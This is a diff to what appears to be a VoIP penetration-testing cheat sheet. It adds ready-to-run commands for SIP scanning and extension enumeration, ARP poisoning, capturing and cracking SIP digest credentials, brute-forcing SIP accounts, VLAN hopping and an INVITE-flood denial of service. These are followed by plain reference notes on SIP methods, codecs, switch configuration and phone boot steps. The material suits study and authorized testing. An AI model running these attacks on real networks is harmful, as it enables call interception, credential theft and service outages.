@@ -5,7 +5,16 @@ SMAP
 smap -o 192.168.4.111
 SIPVICIOUS
 svmap 192.168.4.1-128
+	--scanner for sip enabled hosts
 svwar -e200-300 192.168.4.111 -m INVITE
+	--enumerates extensions using range of extensions or a dictionary file
+sipsak -vv -s sip:192.168.1.221
+	--tests SIP enabled applications and devices using the OPTION request method
+./sip-scan -i eth0 192.168.1.1-254
+	--scanner for sip enabled hosts
+./enumiax -v -m3 -M3 192.168.1.104
+./enumiax -d dict -v 192.168.1.104
+	--enumerate Asterisk Exchange protocol usernames
 IKE-SCAN
 ike-scan 192.168.207.134
 ike-scan -A 192.168.207.134
@@ -18,9 +27,106 @@ psk-crack -d /path/to/dictionary 192-168-207-134key
 	http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
 
 
+Attack Vectors
 
-From Packet Captures
+ARP Poisoning (arpspoof)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof –t victim gateway
+arpspoof –t gateway victim
+
+From Packet Captures -
+Capturing SIP Authentication (sipdump)
+sipdump -i eth0
+sipdump -i eth0 auth.txt
+sipdump -p /root/registration.pcap auth.txt
 sipdump auth.txt -p auth.pcap
+Cracking SIP Digest response hashes -
 sipcrack auth.txt -w wordlist.txt
 
+Brute forcing SIP Accounts (svcrack)
+svcrack.py -u200 -d wordlist.txt 192.168.1.104
+svcrack.py -u200 -r100000-999999 192.168.1.104
 
+VLAN Hopping (voiphopper)
+modprobe 8021q
+voiphopper -i eth0 -c 0
+voiphopper -i eth0 -v 20
+
+Denial Of Service (inviteflood)
+inviteflood eth0 <target_extension> <target_domain> <target_ip number_of_packets>
+	-flood a target with INVITE requests
+	--target sip gateways/proxies and sip phones
+
+
+
+
+Signaling Protocols
+ITU-T H.323
+	Originally designed for multimedia transmission over ISDN; mature and widely supported; peer-to-peer call control
+Session Initiation Protocol (SIP)
+	Text-based, similar in nature to HTTP; defined in RFC 3261; peer-to-peer call control
+Media Gateway Control Protocol (MGCP)
+	Employs centralized call control; defined in RFC 3661
+Skinny Client Control Protocol (SCCP)
+	Cisco-proprietary; limited support on gateways; centralized control
+
+SIP
+port 5060 tcp udp -unencrypted
+port 5061 TLS
+	--ASCII-based
+	--request-response model
+	--SIP client request is made using a SIP URI a user agent and a method/request
+	--address format: user/phone@domain/ip
+
+SIP Requests/Methods
+INVITE		Used to invite and account to participate in a call session.
+ACK			Acknowledge an INVITE request.
+CANCEL		Cancel a pending request.
+REGISTER	Register user with a SIP server.
+OPTIONS		Lists information about the capabilities of a caller.
+BYE			Terminates a session between two users in a call.
+REFER		Indicates that the recipient(identified by the Request URI) should contact a third party using the contact information provided in the request.
+SUBSCRIBE	The SUBSCRIBE method is used to request current state and state updates from a remote node.
+NOTIFY		The NOTIFY method is used to notify a SIP node that an event which has been requested by an earlier SUBSCRIBE method has occurred.
+
+SIP Responses
+1xx			Informational responses, Request received and being
+2xx			Successful responses The action was successfully received, understood, and accepted.
+3xx			Redirection responses
+4xx			Request failure responses The request contains bad syntax or cannot be fulfilled at the server.
+5xx			Server failure responses The server failed to fulfill an apparently valid request.
+6xx			Global failure responses The request cannot be fulfilled at any	server.
+
+
+
+Voice Codecs
+Codec  			MOS	   	Bandwidth 	Complexity
+G.722 SB-ADPCM 	4.13 	48-64 kbps 	Medium
+G.711 PCM 		4.1 	64 kbps		Low
+iLBC 			4.1 	15.2 kbps 	High
+G.729 CS-ACELP	3.92 	8 kbps 		High
+G.726 ADPCM 	3.85 	32 kbps 	Medium
+G.729a CS-ACELP 3.7 	8 kbps 		Medium
+G.728 LD-CELP 	3.61 	16 kbps 	High
+
+Access Switch Port Configuration
+interface FastEthernet0/1
+switchport access vlan <VLAN>
+switchport voice vlan <VLAN>
+	-configure data and voice access VLANs
+mls qos trust cos
+	-trust ingress QoS markings
+power inline static [max <wattage>]
+	-pre-allocate power for the port
+
+IP Phone Boot Process
+1. Power Over Ethernet (Optional)
+	Power is supplied via IEEE 802.3af/at or Cisco ILP
+2. VLANs Learned via CDP or LLDP
+	Voice and data VLANs communicated via CDP/LLDP
+3. IP Assignment via DHCP
+	The phone sends a DHCP request in the voice VLAN; the response includes an IP and DHCP option 150
+4. Configuration Retrieved via TFTP
+	The phone retrieves its configuration from one of the TFTP servers specified in the DHCP option
+5. Registration
+	The phone registers with the call server(s) specified in its configuration
